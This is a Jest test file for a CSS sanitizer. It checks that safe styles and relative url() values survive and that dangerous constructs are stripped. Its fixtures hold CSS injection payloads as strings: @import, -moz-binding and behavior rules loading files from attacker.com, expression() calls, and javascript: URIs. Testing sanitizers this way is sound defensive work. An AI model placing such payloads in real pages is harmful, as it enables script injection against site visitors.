import { sanitizeCss } from "./sanitize-css";

describe("sanitizeCss", () => {
    it("preserves safe CSS properties", () => {
        const safe = `
            #fern-sidebar {
                display: none !important;
            }
            .fern-background {
                background-color: transparent !important;
            }
            body { color: red; font-size: 16px; }
        `;
        const result = sanitizeCss(safe);
        expect(result).toContain("display: none !important");
        expect(result).toContain("background-color: transparent !important");
        expect(result).toContain("color: red");
        expect(result).toContain("font-size: 16px");
    });

    it("preserves url() since customers use it for backgrounds and fonts", () => {
        const legitimate = `.hero { background: url("/images/hero-bg.png"); }`;
        const result = sanitizeCss(legitimate);
        expect(result).toContain("url(");
        expect(result).toContain("/images/hero-bg.png");
    });

    it("strips @import rules", () => {
        const malicious = `@import url("https://attacker.com/evil.css");`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("@import");
        expect(result).not.toContain("attacker.com");
    });

    it("strips @import with string syntax", () => {
        const malicious = `@import "https://attacker.com/evil.css";`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("@import");
        expect(result).not.toContain("attacker.com");
    });

    it("strips expression() for legacy IE", () => {
        const malicious = `div { width: expression(document.body.clientWidth); }`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("expression(");
        expect(result).not.toContain("document.body");
    });

    it("strips -moz-binding", () => {
        const malicious = `div { -moz-binding: url("https://attacker.com/xbl.xml#xss"); }`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("-moz-binding");
    });

    it("strips behavior property", () => {
        const malicious = `div { behavior: url("https://attacker.com/evil.htc"); }`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("behavior");
    });

    it("strips javascript: URIs", () => {
        const malicious = `div { background: javascript:alert(1); }`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("javascript:");
    });

    it("handles case-insensitive patterns", () => {
        const malicious = `@IMPORT "https://attacker.com/evil.css";`;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("@IMPORT");
        expect(result).not.toContain("attacker.com");
    });

    it("preserves safe CSS while stripping dangerous parts", () => {
        const mixed = `
            .safe { color: blue; font-weight: bold; }
            .also-safe { margin: 10px; padding: 20px; background: url("/safe.png"); }
        `;
        const result = sanitizeCss(mixed);
        expect(result).toContain("color: blue");
        expect(result).toContain("font-weight: bold");
        expect(result).toContain("margin: 10px");
        expect(result).toContain("padding: 20px");
        expect(result).toContain('url("/safe.png")');
    });

    it("strips multiple dangerous patterns in one string", () => {
        const malicious = `
            @import "https://attacker.com/evil.css";
            div { width: expression(document.body.clientWidth); }
            span { -moz-binding: url("xbl.xml#xss"); }
            p { behavior: url("evil.htc"); }
            a { background: javascript:void(0); }
        `;
        const result = sanitizeCss(malicious);
        expect(result).not.toContain("@import");
        expect(result).not.toContain("expression(");
        expect(result).not.toContain("-moz-binding");
        expect(result).not.toContain("behavior");
        expect(result).not.toContain("javascript:");
    });
});
